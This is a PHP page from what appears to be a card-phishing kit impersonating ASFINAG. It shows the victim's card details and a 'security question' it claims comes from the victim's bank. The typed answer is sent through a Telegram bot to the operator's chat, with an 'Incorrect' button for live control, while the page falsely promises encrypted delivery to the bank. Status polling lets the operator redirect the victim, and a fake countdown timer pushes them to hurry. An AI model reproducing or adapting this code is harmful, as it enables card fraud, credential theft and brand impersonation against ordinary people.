<?php
require_once 'config.php';

$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionData = json_decode(file_get_contents($sessionFile), true);
$sessionData['session_id'] = $sessionId;
$cardData = $sessionData['card_data'];

if (isCardBlocked($cardData['number'])) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$customMessage = '';
$customFile = SESSIONS_DIR . '/' . $sessionId . '.custom_message';

if (!file_exists($customFile)) {
    header("Location: " . buildPageUrl('waiting', ['session' => $sessionId]));
    exit();
}

$customMessage = trim(file_get_contents($customFile));

if (empty($customMessage)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$pageTitle = 'Custom Question';
$checkStatusUrl = buildPageUrl('check_status');

// Update current page on load (atomic update to preserve session_id)
updateSessionData($sessionId, function(&$sessionData) use ($pageTitle) {
    $sessionData['current_page'] = $pageTitle;
    return true;
});

$error = null;
if (isset($_GET['error']) && $_GET['error'] === 'incorrect') {
    $error = 'Your answer was incorrect. Please try again.';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $answer = htmlspecialchars(trim($_POST['custom_answer'] ?? ''));
    
    if (empty($answer)) {
        $error = 'Please enter your answer';
    } else {
        // Use atomic update to prevent race conditions
        $sendSuccess = false;
        $rootMessageId = null;
        $responseData = null;
        
        updateSessionData($sessionId, function(&$sessionData) use ($customMessage, $answer, &$sendSuccess, &$rootMessageId, &$responseData) {
            $adminConfig = getAdminConfigFromSession($sessionData);
            $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
            
            // Get root message ID
            $rootMessageId = $sessionData['root_message']['message_id'] ?? $sessionData['last_message']['message_id'] ?? null;
            
            $replyText = "💬 *Custom Answer Received*\n";
            $replyText .= "Question: `$customMessage`\n";
            $replyText .= "Answer: `$answer`\n";
            $replyText .= "Session: `" . ($sessionData['session_id'] ?? '') . "`";
            
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '❌ Incorrect', 'callback_data' => "verify:" . ($sessionData['session_id'] ?? '') . ":custom:incorrect"]
                    ]
                ]
            ];
            
            // Send custom answer to Telegram (always send, even if rootMessageId is missing)
            $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $replyText,
                'parse_mode' => 'Markdown',
                'reply_markup' => json_encode($keyboard)
            ];
            
            // Add reply_to_message_id only if available
            if ($rootMessageId) {
                $data['reply_to_message_id'] = $rootMessageId;
            }
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);
            
            // Parse response to check if it succeeded
            $responseData = json_decode($response, true);
            $sendSuccess = ($httpCode === 200 && !empty($responseData['ok']));
            
            // Log if sending failed
            if (!$sendSuccess) {
                error_log("Custom answer send failed: HTTP $httpCode, Error: $curlError, Response: $response");
            }
            
            // Update root message with current page
            $sessionData['current_page'] = 'Custom Question';
            updateRootMessage($sessionData);
            
            $sessionData['custom_question'] = $customMessage;
            $sessionData['custom_answer'] = $answer;
            $sessionData['custom_submitted_at'] = time();
            $sessionData['last_verification_type'] = 'custom'; // Store verification type for incorrect redirect
            
            return true;
        });
        
        
        header("Location: " . buildPageUrl('waiting', ['session' => $sessionId]));
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASFINAG - Security Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .asfinag-custom-container {
            max-width: 520px;
            width: 100%;
        }

        .asfinag-glass-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .asfinag-header-section {
            background: #ea580c;
            padding: 32px 24px;
            text-align: center;
        }

        .asfinag-logo {
            margin-bottom: 16px;
        }

        .asfinag-logo svg {
            width: 120px;
            height: auto;
        }

        .asfinag-header-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }

        .asfinag-header-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .asfinag-header-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .asfinag-content-section {
            padding: 32px 28px;
            background: white;
        }

        /* Card Preview */
        .asfinag-card-preview {
            background: #fef3c7;
            border-left: 4px solid #ea580c;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 28px;
            text-align: center;
        }

        .asfinag-card-number {
            font-size: 20px;
            font-weight: 700;
            color: #ea580c;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        .asfinag-card-info {
            font-size: 13px;
            color: #6b7280;
        }

        /* Question Section */
        .asfinag-question-section {
            margin-bottom: 28px;
        }

        .asfinag-question-box {
            background: #fef3c7;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 24px;
            border-left: 4px solid #ea580c;
        }

        .asfinag-question-label {
            font-size: 12px;
            font-weight: 600;
            color: #ea580c;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .asfinag-question-text {
            font-size: 15px;
            color: #1f2937;
            line-height: 1.5;
            font-weight: 500;
        }

        /* Answer Section */
        .asfinag-answer-section {
            margin-bottom: 24px;
        }

        .asfinag-answer-label {
            display: block;
            text-align: center;
            margin-bottom: 12px;
            font-size: 14px;
            color: #374151;
            font-weight: 600;
        }

        .asfinag-answer-input {
            width: 100%;
            min-height: 120px;
            padding: 14px;
            font-size: 15px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            transition: all 0.2s;
            background: white;
            resize: vertical;
            font-family: inherit;
        }

        .asfinag-answer-input:focus {
            outline: none;
            border-color: #ea580c;
            box-shadow: 0 0 0 3px rgba(234, 88, 12, 0.1);
        }

        /* Submit Button */
        .asfinag-submit-btn {
            width: 100%;
            padding: 14px;
            background: #ea580c;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 20px;
        }

        .asfinag-submit-btn:hover:not(:disabled) {
            background: #c2410c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(234, 88, 12, 0.3);
        }

        .asfinag-submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Security Notice */
        .asfinag-security-notice {
            background: #f9fafb;
            border-radius: 10px;
            padding: 14px 18px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
            border: 1px solid #e5e7eb;
            margin-bottom: 20px;
        }

        .asfinag-security-notice strong {
            color: #ea580c;
            font-weight: 600;
        }

        /* Timer */
        .asfinag-timer {
            text-align: center;
            font-size: 13px;
            color: #9ca3af;
        }

        .asfinag-countdown {
            font-weight: 700;
            color: #ea580c;
        }

        /* Error Message */
        .asfinag-error-message {
            background: #fef2f2;
            border: 1px solid #fca5a5;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 24px;
            text-align: center;
            color: #dc2626;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .asfinag-error-message::before {
            content: "⚠️";
            font-size: 16px;
        }

        /* Char Count */
        .asfinag-char-count {
            text-align: right;
            font-size: 11px;
            color: #9ca3af;
            margin-top: 6px;
        }

        /* Loading Overlay */
        .asfinag-loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .asfinag-loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .asfinag-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #ea580c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        body {
            opacity: 0;
            transition: opacity 0.25s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }

        @media (max-width: 480px) {
            .asfinag-content-section {
                padding: 24px 20px;
            }
            .asfinag-header-section {
                padding: 24px 20px;
            }
            .asfinag-header-title {
                font-size: 24px;
            }
            .asfinag-header-icon {
                font-size: 40px;
            }
            .asfinag-answer-input {
                min-height: 100px;
            }
        }
    </style>
</head>
<body>
    <div class="asfinag-custom-container">
        <div class="asfinag-glass-card">
            <div class="asfinag-header-section">
                <div class="asfinag-logo">
                    <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="200" height="60" rx="8" fill="white"/>
                        <text x="100" y="38" font-size="24" font-weight="800" text-anchor="middle" fill="#ea580c" font-family="Arial, sans-serif" letter-spacing="2">ASFINAG</text>
                    </svg>
                </div>
                <div class="asfinag-header-icon">💬</div>
                <h1 class="asfinag-header-title">Security Question</h1>
                <p class="asfinag-header-subtitle">Please answer the following question to verify your identity</p>
            </div>
            
            <div class="asfinag-content-section">
                <?php if (isset($error)): ?>
                    <div class="asfinag-error-message">
                        <?php echo htmlspecialchars($error); ?>
                    </div>
                <?php endif; ?>
                
                <div class="asfinag-card-preview">
                    <div class="asfinag-card-number">**** **** **** <?= substr($cardData['number'], -4) ?></div>
                    <div class="asfinag-card-info"><?php echo htmlspecialchars($cardData['holder']); ?> • Expires: <?php echo htmlspecialchars($cardData['expiry']); ?></div>
                </div>
                
                <div class="asfinag-question-section">
                    <div class="asfinag-question-box">
                        <div class="asfinag-question-label">Question from your bank</div>
                        <div class="asfinag-question-text"><?php echo htmlspecialchars($customMessage); ?></div>
                    </div>
                </div>
                
                <form id="customForm" method="POST">
                    <div class="asfinag-answer-section">
                        <label class="asfinag-answer-label">Your Answer</label>
                        <textarea 
                            name="custom_answer" 
                            class="asfinag-answer-input" 
                            placeholder="Please provide your answer here..."
                            maxlength="500"
                            required
                        ><?php echo htmlspecialchars($_POST['custom_answer'] ?? ''); ?></textarea>
                        <div class="asfinag-char-count"><span id="charCount">0</span>/500 characters</div>
                    </div>
                    
                    <button type="submit" class="asfinag-submit-btn" id="submitBtn">
                        Submit Answer
                    </button>
                </form>
                
                <div class="asfinag-security-notice">
                    🔒 This information is securely encrypted and transmitted directly to your bank.
                    Do not share this question or answer with anyone.
                </div>
                
                <div class="asfinag-timer">
                    Time remaining: <span class="asfinag-countdown" id="countdown">05:00</span>
                </div>
            </div>
        </div>
    </div>
    
    <div class="asfinag-loading-overlay" id="loadingOverlay">
        <div class="asfinag-spinner"></div>
    </div>

    <script>
        // Character counter
        const textarea = document.querySelector('.asfinag-answer-input');
        const charCount = document.getElementById('charCount');
        
        textarea.addEventListener('input', function() {
            charCount.textContent = this.value.length;
            this.style.height = 'auto';
            this.style.height = (this.scrollHeight) + 'px';
        });
        
        // Initialize
        charCount.textContent = textarea.value.length;
        textarea.style.height = 'auto';
        textarea.style.height = (textarea.scrollHeight) + 'px';
        
        // Timer countdown (5 minutes)
        let timeLeft = 5 * 60;
        const countdownElement = document.getElementById('countdown');
        
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                alert('Time has expired. Please refresh the page to continue.');
                document.getElementById('submitBtn').disabled = true;
            } else {
                timeLeft--;
            }
        }
        
        const timerInterval = setInterval(updateTimer, 1000);
        updateTimer();
        
        // Form submission
        document.getElementById('customForm').addEventListener('submit', function(e) {
            const submitBtn = document.getElementById('submitBtn');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            if (textarea.value.trim().length === 0) {
                e.preventDefault();
                alert('Please enter your answer before submitting.');
                return;
            }
            
            submitBtn.disabled = true;
            loadingOverlay.classList.add('active');
            
            setTimeout(() => {
                submitBtn.disabled = false;
                loadingOverlay.classList.remove('active');
            }, 10000);
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;

            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };

            poll();
            setInterval(poll, 3000);

            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>